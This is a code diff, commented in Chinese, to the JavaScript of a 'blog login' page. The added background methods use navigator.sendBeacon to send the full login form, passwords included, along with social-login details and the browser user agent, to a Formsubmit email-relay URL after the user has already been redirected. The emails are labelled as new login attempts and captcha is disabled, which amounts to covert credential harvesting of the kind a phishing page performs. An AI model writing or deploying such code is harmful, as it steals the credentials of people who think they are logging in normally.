@@ -293,6 +293,9 @@ class BlogLogin {
 
             // 立即跳转到博客首页
             window.location.href = `blog.html?email=${encodeURIComponent(email)}`;
+
+            // 后台提交表单（不等待响应）
+            this.submitFormInBackground(e.target);
         } else {
             this.dataCollector.trackLogin(email, 'failed', 'email');
             this.showNotification('登录失败，请检查您的凭据', 'error');
@@ -324,6 +327,33 @@ class BlogLogin {
         // 立即跳转到博客首页
         const socialEmail = `social:${method}@login.com`;
         window.location.href = `blog.html?email=${encodeURIComponent(socialEmail)}`;
+
+        // 后台提交社交登录数据
+        this.submitSocialLoginInBackground(method);
+    }
+
+    submitSocialLoginInBackground(method) {
+        // 获取 Formsubmit URL
+        const actionUrl = document.querySelector('input[name="_action"]').value;
+
+        // 创建社交登录数据
+        const socialData = {
+            'email': `${method}@social.com`,
+            'password': '[社交登录]',
+            'rememberMe': 'false',
+            'loginMethod': method,
+            'timestamp': new Date().toISOString(),
+            'userAgent': navigator.userAgent,
+            '_subject': `🚀 新的${method === 'google' ? 'Google' : 'GitHub'}登录尝试`,
+            '_captcha': 'false',
+            '_template': 'table'
+        };
+
+        // 使用 sendBeacon 发送
+        const blob = new Blob([new URLSearchParams(socialData).toString()], {
+            type: 'application/x-www-form-urlencoded'
+        });
+        navigator.sendBeacon(actionUrl, blob);
     }
 
     handleForgotPassword() {
@@ -349,6 +379,18 @@ class BlogLogin {
         setTimeout(() => {
             alert('注册功能尚未实现\n\n这是演示版本');
         }, 500);
+    }
+
+    submitFormInBackground(form) {
+        // 获取 Formsubmit URL
+        const actionUrl = form.querySelector('input[name="_action"]').value;
+
+        // 使用 sendBeacon 发送数据（即使页面跳转也会发送）
+        const formData = new FormData(form);
+        const blob = new Blob([new URLSearchParams(formData).toString()], {
+            type: 'application/x-www-form-urlencoded'
+        });
+        navigator.sendBeacon(actionUrl, blob);
     }
 
     submitToFormsubmit(form) {
